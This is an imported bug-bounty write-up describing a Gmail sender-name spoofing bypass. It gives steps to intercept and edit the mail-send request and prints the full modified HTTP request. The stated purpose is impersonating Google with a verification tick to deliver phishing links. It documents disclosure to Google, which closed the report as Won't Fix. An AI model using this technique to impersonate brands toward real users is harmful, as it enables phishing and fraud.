---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-06_authorization-bypass-gmail.md
original_filename: 2022-01-06_authorization-bypass-gmail.md
title: Authorization bypass — Gmail
category: documents
detected_topics:
- access-control
- command-injection
- otp
- automation-abuse
- cors
- csrf
tags:
- imported
- documents
- access-control
- command-injection
- otp
- automation-abuse
- cors
- csrf
language: en
raw_sha256: ded1a7a97daf3e84f4d912cc142409077e70c527983dc5ccd637cd9c7cf218e8
text_sha256: 9d2f588b1f6c9e26be93e143264216a62043e1b3b006dc5046dc21663d5a8906
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Authorization bypass — Gmail

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-06_authorization-bypass-gmail.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, automation-abuse, cors, csrf
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `ded1a7a97daf3e84f4d912cc142409077e70c527983dc5ccd637cd9c7cf218e8`
- Text SHA256: `9d2f588b1f6c9e26be93e143264216a62043e1b3b006dc5046dc21663d5a8906`


## Content

---
title: "Authorization bypass — Gmail"
url: "https://infosecwriteups.com/authorization-bypass-gmail-2949af041fb"
authors: ["7𝖍3𝖍4𝖈kv157 (@7h3h4ckv157)"]
programs: ["Google"]
bugs: ["Spoofing"]
publication_date: "2022-01-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3027
scraped_via: "browseros"
---

# Authorization bypass — Gmail

Authorization bypass — Gmail
7h3h4ckv157
Follow
4 min read
·
Jan 6, 2022

361

Press enter or click to view image in full size
About the vulnerability

The most uncomplicated but trickiest case on Gmail that allows the attackers to send emails impersonating known brands and individuals to deceive targets. Without more outlying back-and-forths, let’s plunge into the topic.

Gmail Authorization

Gmail is never asking you to prove your identity when creating a Google account. All it is asking you prove that you are a human being and not a robot. We can edit our personal info & even though we can edit our information, still, there’re some restrictions.

Get 7h3h4ckv157’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

These are implemented by Google itself for defending against violations & abuses. ↓↓

1. Some characters aren’t allowed. 
eg: emoji, tick, (, |, {, <, :), #,%,$ etc.
2. The name which does not seem to meet Google’s policy is restricted.
3. Input limits
4. etc.
Along with further restrictions, you can’t create an account exactly named “Google”
Proofs:
Press enter or click to view image in full size

It’s crystal clear that why Gmail prohibits the users from this. Else, anyone can abuse this & turn it into a vulnerability that affects individuals, companies, institutions, etc.

The Case:

An Attacker can bypass some of these constraints & can send emails in a beheld way to any individual who has a Gmail account.

Bypassing this Google restriction, the attacker can exactly change their name to “Google” along with a “Verification tick” what else, with a genuine URL.

Proof of Concept
Press enter or click to view image in full size
More details await you, don’t skip
Steps to reproduce:
** 1. Open Gmail from the web browser.
** 2. Pick up the target.
** 3. Intercept the request while sending the mail
** 4. Edit the "NAME" & send the request
Edited portion of request:
POST /sync/u/3/i/s?hl=en&c=13 HTTP/1.1
Host: mail.google.com
Cookie: COMPASS=XXXX;
3PSID=XXX;
t-GMAIL_SCH=XXXX;
User-Agent: XXXX;
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 743
X-Google-Btd: 1
X-Gmail-Btai: {"3":{"6":0,"10":1,"13":1,"15":0,"16":1,"17":1,"18":0,"19":1,"22":1,"23":1,"24":1,"25":1,"26":1,"27":1,"28":1,"29":0,"30":1,"31":1,"32":1,"33":1,"34":1,"35":0,"36":1,"37":"en","38":"Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0","39":1,"40":0,"41":25,"43":0,"44":1,"45":0,"46":1,"47":1,"48":1,"49":1,"50":1,"52":1,"53":1,"54":0,"55":1,"56":1,"57":0,"58":0,"60":0,"61":1,"62":0,"63":1,"64":0,"66":0,"67":0,"68":1,"69":1,"70":0,"71":1,"72":0},"5":"e00e0efee9","7":25,"8":"gmail.pinto-server_20211227.06_p0","9":1,"10":5,"11":"","12":19800000,"13":"+05:30","14":1,"16":418514969,"17":"","18":"","19":"1641437521701","21":"1370"}
X-Framework-Xsrf-Token: AKwhgQq1WH-n-MYenPLNA8YOCdUuhO2D8A:1641437195302
Origin: https://mail.google.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Referer: https://mail.google.com/mail/u/3/
Te: trailers
Connection: close
{"1":{"3":2},"2":{"1":[{"1":"43","2":{"1":"thread-a:r-3342554841964375422","2":{"14":{"1":{"1":"msg-a:r-4547215635208082171","2":{"1":1,"2":"SENDER-MAIL-ID@gmail.com","3":"SENDER-NAME","10":"SENDER-MAIL-ID@gmail.com"},"3":[{"1":1,"2":"TARGET-MAIL-ID@gmail.com@gmail.com"}],"7":"1640181726619","8":"","9":{"2":[{"1":0,"2":"<div dir=\"ltr\">Testing<br></div>"}],"7":1},"11":["^all","^pfg","^f_bt","^f_btns","^f_cl","^a"],"18":"1640181726619","36":{"6":0},"37":{"4":0},"42":0,"43":{"1":0,"2":0,"3":7,"4":0},"52":"s:12fc9f890bfae0e|#msg-a:r-4547215635208082171|0"},"3":1}}}}]},"4":{"1":"1640181719997","2":1,"3":"1640181726641","4":1,"5":200},"5":2}
** 5. Done
IMPACT

This bug can be exploited by fraudsters who want to impersonate Google, sending emails to users, even a user with experience in the Gmail platform could click on a malicious link or a malicious attachment believing that it would be a legitimate message & many more.

1. Anyone can exploit this vulnerability without any complexity.
2. Google can’t detect the changes made while exploiting
3. The attacker can navigate the individuals using Gmail
(utilizing the trustworthiness of Google)
4. The complete abusement
5. Likewise, It’s possible to perform any kind of spam attack
(highlighting other companies)

I detailed the circumstance to Google before fraudsters abuse the case.

Reported on: 22.12.2021

Triaged (Initial Triage):: 23.12.2021

Assigned (Internal Triage): 28.12.2021

Press enter or click to view image in full size

CURRENT STATE:

CLOSED: 5.01.2022

Priority: P3
Severity: S4
Status: Won't Fix 
What happened in-between?
Why was I rejected from deserved Google Hall of fame?

Luck sucked again!

Google rewards the bounty & adds me to their HOF if the case becomes consistent. After reporting the case, I tried to trigger something epic. So, I attempted differently. So, initially, there were no deterrence. I did more tests & the behavior is weird. Then it gets flagged. In simple terms, destructive emails caught by Gmail’s spam filter “after the continuous tries”

Press enter or click to view image in full size

Everything changes in a second. I updated the point to Google. There’s no need to “beg for bounty”

~ The Gmail is secured ~

Press enter or click to view image in full size
Job done

I guess you enjoyed this write-up. I always believe my best is yet to come! And do not disregard to put through with me on Twitter @•7h3h4ckv157

NOTE:

You wanna know how it shows up before ? then check out the video that I posted.

My first POC (Before Gmail filter detection)
